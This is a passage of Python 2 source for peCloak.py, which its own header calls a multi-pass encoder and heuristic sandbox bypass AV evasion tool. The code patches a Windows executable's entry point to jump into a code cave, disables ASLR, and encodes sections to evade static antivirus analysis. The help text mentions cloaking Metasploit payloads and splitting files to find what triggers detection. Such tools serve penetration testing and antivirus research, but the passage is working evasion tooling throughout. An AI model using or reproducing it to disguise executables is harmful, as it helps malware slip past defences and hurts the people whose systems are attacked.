	print "\n========= INFORMATIONAL OPTIONS =========\n"
	print "-h, --help                                You're looking at it\n"
	print "-i, --info= [section]                     Print info for image / section"
	print "                                             - Possible options:"
	print "                                               all = print image info and detailed info for all sections"
	print "                                               none = print info for image only"
	print "                                               [section_name] = print image info and detailed info for named section\n"
	print "-d, --dump [section:start:stop]           Dump (print) hex / ascii for range of bytes of named section"
	print "                                             - The range is an offset (from section start) and byte count"
	print "                                             - You can provide the values in either decimal or hex but"
	print "                                               keep in mind that these are offsets from the section start!\n"
	print "                                             - Example 1: -p .text:0-2000 means start at offset 0 of"
	print "                                               .text section and print 2000 bytes in total\n"
	print "                                             - Example2 : -p .text:14h-1000 means start at offset 14 hex (20d) of"
	print "                                               .text section and print 1000 bytes in total\n"
	print "\n========= CORE CLOAK OPTIONS =========\n"
	print "-e, --encode= [section:offset:length]     Encode the named section. By default, running this script without"
	print "                                          specifying this option will encode the .text section. You can also"
	print "                                          use this option to specify a different section. To name multiple sections"
	print "                                          separate them by commas. Note: range values are base 10 integers!" 
	print "                                             - Examples:" 
	print "                                               -e .text:5:500         encode 500 bytes of .text section starting at offset 5"
	print "                                               -e .rdata:100          encode .rdata section starting at offset 100"
	print "                                               -e .text, .rdata       encode all of .text and .rdata sections"
	print "                                               -e .text, rdata:0:100  encode all of .text section and first 100 bytes of .rdata\n" 
	print "-a, --add                                 Force addition of new section (.NewSec) for code cave"
	print "                                          Otherwise the script will try to add it to the existing .text/.code section"
	print "                                          if enough room is found."
	print "-H, --heuristic= [x]                      Specify the number of iterations for the "
	print "                                          heuristic bypass code (default=3)\n"
	print "-p, --preset= [preset]                    Use a preset encoding configuration to cloak your executable"
	print "                                          Useful if you cloak the same types of files frequenty (e.g. Metasploit payloads)"
	print "                                          Use a ? as the option value to see a list of currently configured presets"
	print "\n========= ADDITIONAL MODIFICATION OPTIONS =========\n"
	print "-s, --section= [section name]             Specify the pe section to modify" 
	print "                                          that will be modified (default is none)\n"
	print "                                             - Possible options include any valid sections other than .text:" 
	print "                                               .rsrc, .rdata, .data, etc.\n"
	print "                                          Important: If you choose a section to modify that is also being encoded"
	print "                                          the modification happens first!\n"
	print "                                          the modification happens first!\n"
	print "-m, --modification= [x]                   Specify the modification type to make for the target "
	print "                                          section (other than .text)"
	print "                                             - Possible options:" 
	print "                                               1 = swap case of letters (hex values x41-x59 and x61-x7a)"
	print "                                               2 = replace letters with zeros (x00)"
	print "                                               3 = replace non-letters with zeros (x00)\n"
	print "-r, --range= [x:y]                        Specify the range (in bytes) for modification within the"
	print "                                          target pe section (other than .text)\n"
	print "                                             - Format = start:end Example: --range=0:2000" 
	print "                                             - The default is to start at the beginning and" 
	print "                                               modify the entire section"
	print "                                             - Specifying 0 for the start value will also "
	print "                                               start at the beginning"
	print "                                             - Specifying a number larger than the size of "
	print "                                               the section will default to the end of the section\n"
	print "\n========= OTHER OPTIONS =========\n"
	print "-c, --chunk= [chunk_size]                 Split the file into chunks of designated size for AV scanning"
	print "                                          May be useful if you need to determine which portion of a file"
	print "                                          is triggering detection"
	sys.exit()

'''
	main
'''	
def main(argv):

	header =	'\n=========================================================================\n'
	header +=	'|                         peCloak.py (beta)                             |\n'  
	header +=	'|  A Multi-Pass Encoder & Heuristic Sandbox Bypass AV Evasion Tool      |\n'
	header +=	'|                                                                       |\n'  
	header +=	'|           Author: Mike Czumak | T_V3rn1x | @SecuritySift              |\n'
	header +=	'|    Usage: peCloak.py [options] [path_to_pe_file] (-h or --help)       |\n'
	header +=	'=========================================================================\n\n'

	heuristic_iterations = 3
	section_to_encode = "default"
	section_to_mod = ""
	mod_range = ""
	mod_type = ""
	section_info = ""
	section_range = ""
	chunk_size = ""
	preset = ""
	info = False
	print_section = False
	skip_cave_search = False
	
	try:
		opts, args = getopt.getopt(argv, "hai:d:p:e:H:s:r:m:c:", ["help", "add", "info=", "dump=", "preset=", "encode=",  "heuristic=", "section=", "range=", "modification=", "chunk="])
	except getopt.GetoptError:
		print_usage()
		sys.exit(2)
		
	for opt, arg in opts:
		if opt in ("-h"):
			print header
			print_usage()
			sys.exit()    
		elif opt in ("--help"):
			print header
			print_help()
			sys.exit()
		elif opt in ("-i", "--info"):
			section_info = arg
		elif opt in ("-d", "--dump"):
			print_section = True
			section_range = arg
		elif opt in ("-e", "--encode"):
			section_to_encode = arg
		elif opt in ("-H", "--heuristic"):
			heuristic_iterations = int(arg)
		elif opt in ("-s", "--section"):
			section_to_mod = arg
		elif opt in ("-r", "--range"):
			mod_range = arg
		elif opt in ("-m", "--modification"):
			mod_type = arg	
		elif opt in ("-c", "--chunk"):
			chunk_size = arg
		elif opt in ("-a", "--add"):
			skip_cave_search = True
		elif opt in ("-p", "--preset"):
			preset = arg

	try:
		file = args[0]
	except:
		print "[!] ERROR: No pe file provided\n"
		print_usage()
		sys.exit(2)
		
	# run the program with the designated preset and provided exe name
	if preset:
		execute_preset(sys.argv[0], preset, sys.argv[len(sys.argv)-1])
		sys.exit()
		
	print header # print display header
	
	# open file for modification
	try:
		pe =  pefile.PE(file)
	except:
		print "[!] ERROR: Cannot open file [%s] for modification" % file
		sys.exit()

	# get entry point
	ep, ep_ava = get_entry(pe)
	
	# print info for given section and exit
	if section_info:
		get_info(pe, section_info)
		sys.exit() 
		
	# print hex and ascii bytes for given section / range	
	if print_section:
		print_section_bytes(pe, section_range)
		sys.exit()	
		
	# split the file into multiple chunks
	if chunk_size:
		chunk_file(file, chunk_size)
		sys.exit()
	
	# since we're using the image base as our starting point we need to 
	# ensure that ASLR is disabled
	disable_aslr(pe)

	# get our code cave location information
	pe, code_cave_address, code_cave_virtual_offset, code_cave_raw_offset, code_cave_section = get_code_cave(pe, skip_cave_search)
	
	# print section information
	get_sections(pe)
	
	# modify sections other than .text (optional)
	if section_to_mod:
		if mod_range and mod_type:
			mod_section(pe, section_to_mod, mod_type, mod_range)
		else:
			print "[!] Invalid options passed for custom section modification. Ignoring."

	# Prepare to overwrite jump location 
	jmp_overwrite_location = find_overwrite_location(pe) # get the location to overwrite jump instruction to code cave
	code_cave_jump = "\xe8" + code_cave_virtual_offset # generate jump instruction to code cave
	
	# grab the saved entry instructions in original byte form and as a dictionary of text-based commands 
	# which will be used in the modification routine at the end of this function 
	# len(jmp_instruction) is passed to determine how many instructions will be replaced by the jump
	saved_entry_instructions = preserve_entry_instructions(pe, ep, ep_ava, len(code_cave_jump))

	# sometimes if the code cave jump overwrite is shorter than the replaced instructions it can corrupt execution if
	# the program jumps back towards the beginning. This tries to address that by filling any difference with nops
	if len(code_cave_jump) < len(saved_entry_instructions):
		pe.set_bytes_at_offset(jmp_overwrite_location+len(code_cave_jump), "\x90" * (len(saved_entry_instructions) - len(code_cave_jump)))
		
	# build heuristic bypass
	heuristic_bypass = build_heuristic_bypass(heuristic_iterations)

	# build the encoder
	encoder = build_encoder(heuristic_iterations)
	
	# encode the given section(s) to evade static analysis (returns corresponding decoder instructions)
	decoder = encode_data(pe, section_to_encode, encoder)
	
	# modify the entry instructions to rewrite any relative jump addresses that might exist
	# we pass the code_cave_address and length of heuristic bypass/decoder so we can determine the offset to the final
	# jump instructions that will appear at the end of the code cave to resume normal execution flow
	modified_entry_instructions = modify_entry_instructions(ep_ava, saved_entry_instructions, len(heuristic_bypass + decoder), code_cave_address)
	
	# replace first bytes of the entry point with jump to code cave
	print "[*] Overwriting first bytes at physical address %08x with jump to code cave" % (jmp_overwrite_location) 
	pe.set_bytes_at_offset(jmp_overwrite_location, code_cave_jump)
	
	# generate the instructions to restore execution flow 
	current_address = int(code_cave_address, 16) + len(heuristic_bypass + decoder + modified_entry_instructions)  # calculate current address from start of code cave
	new_entry_address = ep_ava + len(saved_entry_instructions) # the new entry address = old entry + length of the overwritten entry instructions
	restore_execution_flow = build_new_entry_jump(current_address, new_entry_address)

	# write heuristic defeating code and decoder to code cave
	write_codecave(pe, code_cave_section, code_cave_raw_offset, heuristic_bypass, decoder, modified_entry_instructions, restore_execution_flow)
	
	# write all changes to modified file
	save_cloaked_pe(pe, file)	
	
if __name__ == '__main__':
    main(sys.argv[1:])


